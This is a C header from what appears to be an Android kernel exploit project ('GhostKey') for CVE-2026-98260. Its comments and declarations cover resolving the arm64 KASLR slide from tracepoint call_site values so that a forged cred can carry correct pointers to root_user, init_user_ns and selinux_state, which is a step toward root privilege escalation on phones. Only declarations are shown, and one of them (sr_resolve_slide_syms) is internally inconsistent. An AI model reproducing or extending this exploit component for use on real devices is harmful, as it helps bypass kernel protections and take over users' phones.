/*
 * slide_resolve.h — 从「trace 里观测到的 call_site」精确反解 KASLR slide。
 *
 * ---------------------------------------------------------------------------
 * 背景
 * ---------------------------------------------------------------------------
 * CVE-2026-98260 的利用链要在运行期拿到内核里的几个「调用点」当 trace 匹配键
 * （k_itimer / cred / task_struct 的 slab 分配点）。
 *
 * GhostKey 原先把它们写死在 profile 里：
 *     timer_link = do_timer_create + 0xa8
 *     cred_link  = prepare_creds     + 0x24
 * 这两个常数是在 6.6.118（小米/OPPO）上标定的。6.18 开了 LTO，函数被内联后
 * 静态偏移整体漂移（实测 do_timer_create+0xa8 是一条 LDAR 指令，不是任何调用点）。
 * 硬套的后果是：
 *   calib_a 反推的 slide = 真实调用点 - 写死锚点  →  带入一个固定偏差；
 *   这个偏差会套到 root_user / init_user_ns / init_groups / init_ucounts /
 *   selinux_state 上  →  伪造的 cred 里全是错的内核指针  →  卡在 leak_cred。
 *
 * ---------------------------------------------------------------------------
 * 本模块的解法
 * ---------------------------------------------------------------------------
 * kmem_cache_alloc tracepoint 的两个字段就够用了：
 *
 *     call_site = 0xffffffc082211060  func = do_timer_create
 *     ptr       = 0xffff888012340000  req = 384  gfp = GFP_KERNEL
 *
 *   - call_site 是 _RET_IP_（BL 的下一条指令），运行期虚拟地址；
 *   - func 是内核侧符号化出来的**包含该地址的函数名**。
 *
 * 而未重定位的函数地址 F 我们本来就有（kallsyms，导入 boot.img 时就抽出来了）。
 * 于是：
 *
 *     call_site = F + slide + off        (off = 调用点在函数内的偏移, 0 <= off < L)
 *     slide ≡ 0 (mod 2 MiB)               (arm64 的 KASLR slide 一定 2MiB 对齐)
 *  =>  off = (call_site - F) mod 2MiB
 *
 * 只要函数长度 L < 2MiB（内核里 virtually always 成立），off 就被**唯一确定**，
 * slide = call_site - F - off 随之精确解出 —— 不需要任何写死的内核内偏移，
 * 也不需要在镜像里盲扫 BL 指令（那样会因为候选太密而产生二十来个伪解）。
 *
 * ---------------------------------------------------------------------------
 * 依赖
 * ---------------------------------------------------------------------------
 * 仅 libc，可在 Android NDK 与主机 gcc 下编译。
 */
#ifndef SLIDE_RESOLVE_H
#define SLIDE_RESOLVE_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* arm64 的 KASLR slide 对齐粒度（内核 text 按 2MiB 对齐） */
#define SR_SLIDE_ALIGN   0x200000ULL
/* slide 的合理上界 */
#define SR_SLIDE_MAX     (1ULL << 42)
/* 函数长度上限：超过这个值 off 就不再唯一 */
#define SR_FUNC_MAX_LEN  0x200000ULL

/* 一个 kallsyms 符号（未重定位 VA） */
typedef struct {
    uint64_t    va;
    const char *name;   /* 可为 NULL */
} sr_sym;

/*
 * 在按 VA 升序排列的符号表里，找出「包含 addr 的那个符号」。
 * 返回 1 命中；0 没命中（addr 落在符号表之外或空洞里）。
 * out_base / out_len / out_name 可为 NULL。
 */
int sr_find_func(const sr_sym *syms, size_t n, uint64_t addr,
                 uint64_t *out_base, uint64_t *out_len, const char **out_name);

/*
 * 用「函数未重定位基址 + 函数长度 + 运行期 call_site」解出 KASLR slide。
 *
 *   func_va   : 包含该 call_site 的函数的**未重定位**地址（来自 kallsyms）
 *   func_len  : 该函数的长度（下一个符号的 VA - func_va）
 *   call_site : trace 里读到的运行期 call_site
 *   out_slide : 解出的 slide
 *   out_off   : 调用点在函数内的偏移（可选）
 *
 * 返回：1 成功；0 不自洽（off 越界 / slide 不合理）；-1 参数错误。
 */
int sr_resolve_slide(uint64_t func_va, uint64_t func_len, uint64_t call_site,
                     uint64_t *out_slide, uint64_t *out_off);

/*
 * 便捷封装：按**函数名**查符号表，再解 slide。
 * 这才是运行期的真实用法 —— trace 的 func= 字段给的是函数名，
 * 而符号表里的地址是**未重定位**的，两者不在同一个地址空间，
 * 所以不能拿运行期 call_site 去查未重定位的表。
 */
int sr_resolve_slide_named(const sr_sym *syms, size_t n, const char *func_name,
                           uint64_t call_site, uint64_t *out_slide,
                           uint64_t *out_unreloc_site);

/*
 * 按**未重定位**地址查符号表解 slide。
 * 注意：call_site 也必须是未重定位地址（即已经减过 slide），
 *      运行期地址请用 sr_resolve_slide_named()。
 */
int sr_resolve_slide_syms(const sr_sym *syms, size_t n, uint64_t call_site,
                          uint64_t *out_slide, uint64_t *out_unreloc_site);

#ifdef __cplusplus
}
#endif
#endif /* SLIDE_RESOLVE_H */
